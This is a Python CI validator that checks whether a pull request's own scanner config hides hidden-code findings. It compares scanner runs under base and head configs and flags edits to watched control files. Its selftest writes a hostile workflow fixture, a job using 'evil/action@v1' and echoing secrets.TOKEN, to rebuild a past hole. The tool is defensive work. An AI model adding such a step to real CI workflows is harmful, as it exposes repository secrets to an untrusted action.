#!/usr/bin/env python3
"""config_tamper: does a PR's own config hide hidden-code findings?

Runs the hidden-code scanner TWICE on the same BASE..HEAD diff:
  1. with the config as it is at BASE (trusted)
  2. with the config as it is at HEAD (the PR's)
Both runs use the scanner from BASE, so a PR cannot also rewrite the oracle.
Reports every finding present in run 1 and missing from run 2, and flags any
diff touching a watched control file.

  python3 verify/validator/config_tamper.py [--repo DIR] --base REF --head REF [--json]
  python3 verify/validator/config_tamper.py [--repo DIR] --selftest   # rebuilds the RCO #3 hole
Exit 0 = clean, 1 = finding (drop or watched file touched), 2 = error.
"""
from __future__ import annotations
import argparse, json, subprocess, sys, tempfile
from pathlib import Path

SCANNER = "tools/check_hidden_code.py"
CONFIG = "ci/hidden-code.toml"
SNEAKY = ("\n  sneaky:\n    runs-on: ubuntu-latest\n    steps:\n"
          "      - uses: evil/action@v1\n      - run: echo ${{ secrets.TOKEN }}\n")
WATCHED = ("ci/hidden-code.toml", "ci/test-select.toml", ".github/workflows/ci.yml", SCANNER)


def git(repo: Path, *a: str, ok: bool = False) -> str | None:
    p = subprocess.run(["git", *a], cwd=repo, capture_output=True, text=True)
    if p.returncode:
        if ok:
            return None
        raise SystemExit(f"config_tamper: git {' '.join(a)}: {p.stderr.strip()}")
    return p.stdout


def scan(repo: Path, scanner: Path, base: str, head: str, cfg: Path) -> list[dict]:
    p = subprocess.run([sys.executable, str(scanner), "--root", str(repo), "--base", base,
                        "--head", head, "--config", str(cfg), "--json"], capture_output=True, text=True)
    if p.returncode:
        raise SystemExit(f"config_tamper: scanner exit {p.returncode}: {p.stderr.strip()}")
    return json.loads(p.stdout)["findings"]


def check(repo: Path, base: str, head: str) -> dict:
    base = git(repo, "rev-parse", "--verify", f"{base}^{{commit}}").strip()
    head = git(repo, "rev-parse", "--verify", f"{head}^{{commit}}").strip()
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        src = git(repo, "show", f"{base}:{SCANNER}", ok=True)
        scanner_from = "base"
        if src is None:  # scanner did not exist at base
            src, scanner_from = git(repo, "show", f"{head}:{SCANNER}"), "head (absent at base)"
        scanner = td / "scanner.py"; scanner.write_text(src)
        cfgs = {}
        for side, ref in (("base", base), ("head", head)):
            text = git(repo, "show", f"{ref}:{CONFIG}", ok=True) or ""  # absent = scanner defaults
            cfgs[side] = td / f"{side}.toml"; cfgs[side].write_text(text)
        fb = scan(repo, scanner, base, head, cfgs["base"])
        fh = scan(repo, scanner, base, head, cfgs["head"])
    key = lambda f: (f["section"], f["path"], f["line"], f["reason"])
    hk = {key(f) for f in fh}
    dropped = [f for f in fb if key(f) not in hk]
    changed = (git(repo, "diff", "--no-renames", "--name-only", f"{base}..{head}") or "").split()
    touched = [p for p in WATCHED if p in changed]
    return {"base": base, "head": head, "scanner_from": scanner_from,
            "findings_base_config": len(fb), "findings_head_config": len(fh),
            "dropped": dropped, "watched_touched": touched}


def report(r: dict) -> int:
    print(f"config_tamper {r['base'][:8]}..{r['head'][:8]} (scanner from {r['scanner_from']})")
    print(f"  findings: base config {r['findings_base_config']}, head config {r['findings_head_config']}")
    for f in r["dropped"]:
        print(f"  DROPPED by head config: [{f['section']} {f['name']}] {f['where']}: {f['reason']}")
    for p in r["watched_touched"]:
        print(f"  WATCHED file touched: {p}")
    bad = bool(r["dropped"] or r["watched_touched"])
    print("  RESULT:", "FINDING" if bad else "CLEAN")
    return 1 if bad else 0


def selftest(rco: Path) -> int:
    """Rebuild the RCO #3 hole in a throwaway clone of HEAD and require the check to catch it."""
    with tempfile.TemporaryDirectory() as td:
        r = Path(td) / "r"
        start = git(rco, "rev-parse", "--verify", "HEAD^{commit}").strip()
        subprocess.run(["git", "clone", "-q", "--no-checkout", str(rco), str(r)], check=True)
        g = lambda *a: subprocess.run(["git", "-c", "user.name=validator", "-c", "user.email=validator@example.invalid", *a],
                                      cwd=r, check=True, capture_output=True)
        g("checkout", "-q", "-b", "tamper", start)
        wf = r / ".github/workflows/ci.yml"
        wf.write_text(wf.read_text() + SNEAKY)
        (r / CONFIG).write_text('control_plane = ["nothing-here/**"]\n')  # the narrowing
        g("add", "-A"); g("commit", "-q", "-m", "tamper")
        res = check(r, start, "tamper")
        rc = report(res)
        dropped_cp = [f for f in res["dropped"] if f["section"] == 4]
        ok = (rc == 1 and res["findings_head_config"] == 0 and res["findings_base_config"] >= 3
              and len(dropped_cp) >= 3 and CONFIG in res["watched_touched"])
        # control: same edit WITHOUT the narrowing must show no drop
        g("checkout", "-q", "-b", "honest", start)
        wf.write_text(wf.read_text() + SNEAKY)
        g("add", "-A"); g("commit", "-q", "-m", "honest")
        ctl = check(r, start, "honest")
        ok = ok and not ctl["dropped"] and ctl["findings_head_config"] == ctl["findings_base_config"]
        print(f"selftest control (no narrowing): base {ctl['findings_base_config']}, head {ctl['findings_head_config']}, dropped {len(ctl['dropped'])}")
    print("SELFTEST", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--repo", type=Path, default=Path(__file__).resolve().parents[2])
    ap.add_argument("--base"); ap.add_argument("--head", default="HEAD")
    ap.add_argument("--json", action="store_true"); ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        sys.exit(selftest(a.repo.resolve()))
    if not a.base:
        ap.error("--base is required")
    res = check(a.repo, a.base, a.head)
    if a.json:
        print(json.dumps(res, indent=2)); sys.exit(1 if res["dropped"] or res["watched_touched"] else 0)
    sys.exit(report(res))
